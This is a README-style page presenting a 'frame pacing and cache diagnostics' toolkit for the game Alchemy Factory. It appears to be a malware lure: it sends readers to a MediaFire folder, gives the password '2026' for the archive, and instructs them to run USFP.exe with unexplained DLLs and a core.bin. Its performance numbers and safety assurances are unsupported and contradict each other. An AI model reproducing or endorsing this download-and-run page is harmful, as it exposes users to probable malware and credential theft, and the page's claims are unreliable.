<div align="center">

# 🎮 Alchemy Factory — Performance Notes

**Frame pacing and cache diagnostics for Alchemy Factory.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Alchemy Factory is a medieval-themed automation and factory simulation game focused on potion-making, metallurgy, jewelry, and production logistics. It uses Unreal Engine and combines expanding layouts with continuous machine and worker activity. Performance consistency matters because large production networks increase rendering and simulation workload.

Players of Alchemy Factory who need measurable diagnostics for frame pacing, launch behavior, and session stability.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3669570/b2e0a0e2ab371afee8673cb5f89534844825b8d6/ss_b2e0a0e2ab371afee8673cb5f89534844825b8d6.1920x1080.jpg?t=1789021559" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3669570/82e42b2ab1e9eb3ff8fe8010df9d1f052541de70/ss_82e42b2ab1e9eb3ff8fe8010df9d1f052541de70.1920x1080.jpg?t=1789021559" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3669570/1646e11da23407e656a899e9bd51e7ec7f155750/ss_1646e11da23407e656a899e9bd51e7ec7f155750.1920x1080.jpg?t=1789021559" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, average frame rate falls from 58 FPS to 34 FPS when a large factory contains more than 180 active machines.
- On the stated test rig, 1% low performance drops to 14 FPS during camera movement across dense production areas, with 8 frame-time spikes above 50 ms per ten-minute session.
- On the stated test rig, shader compilation takes approximately 90 seconds on launch and can cause two visible pauses during the first factory load.

## 🩺 How the toolkit addresses these issues

- **Large-factory average FPS reduction** → Frame Rate Helper adjusts frame delivery behavior, while Process Scheduling Helper optimizes process scheduling during high simulation load.
- **Low 1% FPS and frame-time spikes** → Frame Timing Helper stabilizes frame delivery and Stability Report + Session Recovery records timing faults and restores the last recoverable session state.
- **Extended launch shader compilation** → Graphics Cache Utility manages graphics cache data, while Startup Parameter Tool applies tuned startup parameters for cache initialization.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild (1-2 minutes)

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for consistent output.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and reduces pacing variance.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for repeatable launches.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and recovers interrupted sessions.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling during simulation-heavy workloads.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and removes stale entries.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- config.cfg <- User configuration
|-- frame_data.pak <- Display sync data
|-- shader_cache.pak <- Shader cache data
|-- Password 2026.txt <- Password reminder (empty)
|-- crash_reader.dll <- Crash log reader
|-- fps_module.dll <- FPS module
|-- core.bin <- Core runtime
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.